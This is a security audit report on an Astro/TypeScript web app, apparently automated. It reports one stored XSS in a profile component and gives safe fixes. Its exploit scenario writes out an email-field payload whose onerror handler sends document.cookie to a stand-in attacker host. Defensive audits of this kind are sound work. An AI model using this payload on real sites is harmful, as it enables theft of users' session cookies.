# Security Review — 2026-06-28

**Branch:** main  
**Scope:** full codebase (no merge-base diff; reviewed all source files)  
**Frameworks:** Astro 5 SSR / TypeScript / Netlify / Neon Auth  
**Confidence threshold:** 8/10 — findings below this are suppressed

---

## Summary

| Severity | Count |
|----------|-------|
| HIGH     | 1     |
| MEDIUM   | 0     |
| LOW      | 0     |

---

## HIGH Findings

### `src/components/ProfileClient.astro:35` — HIGH — XSS (Stored/Reflected via innerHTML)

**Description:**  
The authenticated user's email address is injected directly into `innerHTML` via a template literal without HTML-escaping. Any characters with HTML significance (`<`, `>`, `"`, `'`, `&`) in the email are rendered as markup.

```js
// ProfileClient.astro:35-38
container.innerHTML = `
  <p>Logged in as <strong>${result.data.user.email}</strong></p>
  <button id="sign-out-btn">Sign out</button>
`;
```

**Exploit scenario:**  
1. Attacker registers an account with email: `"><img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>@x.com`  
2. Any user who visits `/profile` while the attacker's session is active — or if the auth session is ever shared / replayed — will execute the payload.  
3. Even without session sharing, the attacker's own `/profile` page executes arbitrary JS in the page context (token theft, DOM manipulation, further pivots).

**Recommendation:**  
Replace `innerHTML` assignment with safe DOM construction using `textContent`:

```js
// Safe replacement
const p = document.createElement("p");
p.textContent = "Logged in as ";
const strong = document.createElement("strong");
strong.textContent = result.data.user.email;
p.appendChild(strong);
container.replaceChildren(p, signOutBtn);
```

Or use a sanitizing helper if rich HTML is ever needed in the future:

```js
function escapeHtml(s: string): string {
  return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")
          .replace(/"/g,"&quot;").replace(/'/g,"&#039;");
}
container.innerHTML = `<p>Logged in as <strong>${escapeHtml(email)}</strong></p>...`;
```

**Confidence:** 9/10

---

## Suppressed / Below-Threshold Observations

The following were investigated and did not reach the 8/10 confidence bar:

| Area | Why suppressed |
|------|---------------|
| `/api/reviews` SSRF (`fetch(${baseUrl}/…)`) | `baseUrl` is a build-time env var — not user-controlled. False positive. |
| `/api/health` information disclosure | Reveals DB/auth connectivity state. Limited exploitability on this demo site. Confidence: 7/10. |
| Missing CSRF token on `POST /api/reviews` | Endpoint requires `application/json` body; cross-origin simple forms can't set that Content-Type. Confidence: 6/10. |
| `authUrl` exposed via `window.__NEON_AUTH_URL__` | URL must be public for client-side auth flow to work; no credentials embedded. Confidence: 5/10. |
| Missing rate limiting on review submission | Operational concern (Netlify layer); no code fix needed here. Confidence: 5/10. |

---

## Secure Patterns Observed

- All SQL in `db.ts`, `lib/films.ts`, `pages/api/reviews.ts` uses tagged template literals (`sql\`...\``) — parameterized queries; no SQLi risk.
- `film_id` and `rating` validated as finite integers before DB write.
- `content` clamped to 1000 chars (`body.content.slice(0, 1000)`).
- `userId` sourced from session, never from request body — no IDOR on review ownership.
- Astro template expressions (`{expr}`) auto-escape HTML — all server-rendered film/actor data is safe.
- Auth middleware enforces session on all routes except the explicit `skipRoutes` allowlist.
- DB query timeout (5 s) and auth fetch timeout (5 s via `AbortSignal.timeout`) prevent resource exhaustion.
- Secrets are env vars only; none committed to source.
